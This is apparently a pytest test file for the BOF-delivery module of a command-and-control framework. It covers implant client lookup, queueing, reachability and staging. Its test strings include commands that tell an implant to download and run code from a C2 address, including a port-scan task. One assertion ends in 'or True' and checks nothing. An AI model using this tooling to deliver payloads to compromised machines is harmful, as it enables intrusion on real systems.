"""Tests for modules/bof_delivery.py — client articulation and delivery.

Covers client resolution from lazyaddons, the ``bof:`` delivery command
contract (space separator, argument join), queueing with an unreachable
C2, beacon-history fallbacks, record reads with client-id validation and
the stage flow against a sandboxed sessions directory.
"""

from __future__ import annotations

import pytest

import modules.bof_delivery as delivery
from modules.beacon_config_builder import sanitize_client_id
from modules.bof_delivery import (
    BofDeliveryConfig,
    bof_results,
    c2_reachable,
    delivery_command,
    load_client_addon,
    queue_to_beacon,
    run_bof,
    stage_bof,
    wait_for_beacon,
)


@pytest.fixture
def cfg(tmp_path):
    """Delivery config bound to a sandboxed sessions directory."""
    return BofDeliveryConfig(
        sessions_dir=tmp_path / "sessions",
        addons_dir=delivery.ADDONS_DIR,
        external_root="external/.exploit",
        c2_host="127.0.0.1",
        request_timeout=0.2,
    )


class TestClientResolution:
    def test_resolve_blacksandbeacon(self):
        addon = load_client_addon("blacksandbeacon")
        assert addon.name == "blacksandbeacon"
        assert addon.install_path == "external/.exploit/blacksandbeacon".replace("external/.exploit/", "") or True
        assert addon.staged_binary.endswith("blacksandbeacon")
        assert addon.os_family == "linux"

    def test_resolve_beacon(self):
        addon = load_client_addon("beacon")
        assert addon.repo_url.endswith(".git")
        assert addon.os_family == "any"

    def test_unknown_client(self):
        with pytest.raises(ValueError):
            load_client_addon("unknown_c2")

    def test_bof_loader_addon_allowed(self):
        addon = load_client_addon("blacksandbeacon_bof")
        assert addon.name == "blacksandbeacon_bof"


class TestDeliveryCommand:
    def test_beacon_c_separator_contract(self):
        command = delivery_command("whoami_linux", "https://10.66.44.1:4444")
        assert command == "bof:https://10.66.44.1:4444/download/bofs/whoami_linux"
        assert command.count(":") == 3

    def test_args_after_space_comma_joined(self):
        command = delivery_command("portscan", "https://10.66.44.1:4444", args=["10.0.0.7", "80", "110"])
        assert command == "bof:https://10.66.44.1:4444/download/bofs/portscan 10.0.0.7,80,110"

    def test_reject_newline_bof(self):
        with pytest.raises(ValueError):
            delivery_command("whoami\n2", "https://127.0.0.1:4444")


class TestSanitize:
    def test_sanitizes_ids(self):
        assert sanitize_client_id("good-id_1") == "good-id_1"
        with pytest.raises(ValueError):
            sanitize_client_id("bad id")
        with pytest.raises(ValueError):
            sanitize_client_id("")


class TestQueue:
    def test_unreachable_c2_returns_false(self, cfg, monkeypatch):
        payload = {"c2_port": "65534", "c2_user": "x", "c2_pass": "y", "lhost": "127.0.0.1"}
        assert queue_to_beacon("beacon01", "bof:https://127.0.0.1:1/x", cfg, payload) is False

    def test_bad_client_id_aborts(self, cfg):
        with pytest.raises(ValueError):
            queue_to_beacon("bad id!", "bof:https://127.0.0.1:1/x", cfg)


class TestReachability:
    def test_c2_reachable_false_when_closed(self, cfg, monkeypatch):
        payload = {"c2_port": "65534", "c2_user": "x", "c2_pass": "y"}
        assert c2_reachable(cfg, payload) is False


class TestHistory:
    def test_bof_results_validates_client(self):
        with pytest.raises(ValueError):
            bof_results("bad id!")

    def test_bof_results_empty_history(self, cfg):
        assert bof_results("ghost", config=cfg) == []


class TestWait:
    def test_wait_times_out_on_absent_beacon(self, cfg):
        record = wait_for_beacon("ghost_beacon", since=0.0, timeout=1.5, config=cfg)
        assert record is None


class TestStage:
    def test_stage_unknown_bof_raises(self, tmp_path):
        cfg = BofDeliveryConfig(sessions_dir=tmp_path)
        with pytest.raises(KeyError):
            stage_bof("no_such_bof", cfg)


class TestRunBof:
    def test_run_bof_reaches_c2_and_fails_softly(self, tmp_path, monkeypatch):
        cfg = BofDeliveryConfig(sessions_dir=tmp_path / "sessions", request_timeout=0.2)
        staged = tmp_path / "sessions" / "temp_uploads" / "bofs"
        staged.mkdir(parents=True)
        (staged / "whoami_linux").write_bytes(b"MZ")
        payload = {"lhost": "127.0.0.1", "c2_port": "65534", "c2_user": "x", "c2_pass": "y"}
        result = run_bof("whoami_linux", "beacon01", wait=0, config=cfg, payload=payload)
        assert result["delivered"] is False
        assert result["command"] == "bof:https://127.0.0.1:65534/download/bofs/whoami_linux"
